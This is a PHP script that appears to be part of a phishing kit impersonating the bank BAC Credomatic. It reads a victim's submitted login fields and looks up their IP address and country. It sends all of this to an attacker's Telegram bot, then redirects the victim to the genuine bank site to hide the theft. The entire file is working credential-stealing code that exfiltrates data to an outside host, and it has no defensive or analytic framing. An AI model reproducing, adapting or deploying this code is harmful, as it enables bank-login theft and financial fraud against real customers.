<?php
   ini_set("display_errors", 0);
   include "aquiva.php";
   
   
   if (isset($_POST['caraqueñAZO']) && isset($_POST['precari0']) ) {
       $breve = $_POST['caraqueñAZO'];
       $breves = $_POST['precari0'];
       $ipInfoResponse = getIpInfo($_SERVER['REMOTE_ADDR']);
       $codigopais = isset($ipInfoResponse['country']) ? $ipInfoResponse['country'] : 'Desconocido';
       $mensajito .= "B4C\nC0D3X #3: ".$_POST['caraqueñAZO']."\nC0D3X B4C #3: ".$_POST['precari0']."\nYYP: ".$_SERVER['REMOTE_ADDR']."\nPaís: ".$codigopais."\nC0DE BY SYN4PSE";
   
       env($tribales, $tulum, $mensajito);
   }
   function getIpInfo($ip) {
       $url = "http://ipinfo.io/{$ip}/json";  
       $curl = curl_init();
       curl_setopt($curl, CURLOPT_URL, $url);
       curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
       $response = curl_exec($curl);
       curl_close($curl);
       
       return json_decode($response, true);
   }
   function env($dakota, $chatsito, $mensajillo) {
       $url = "https://api.telegram.org/bot{$dakota}/sendMessage";
       $data = array(
           'chat_id' => $chatsito,
           'text' => $mensajillo
       );
   
       $options = array(
           CURLOPT_URL => $url,
           CURLOPT_POST => true,
           CURLOPT_POSTFIELDS => http_build_query($data),
           CURLOPT_RETURNTRANSFER => true,
       );
   
       $curl = curl_init();
       curl_setopt_array($curl, $options);
       $response = curl_exec($curl);
       curl_close($curl);
   
       return $response;
       
   }
   echo "<script>window.location.href = \"https://www.baccredomatic.com/\"</script>";
   
   ?>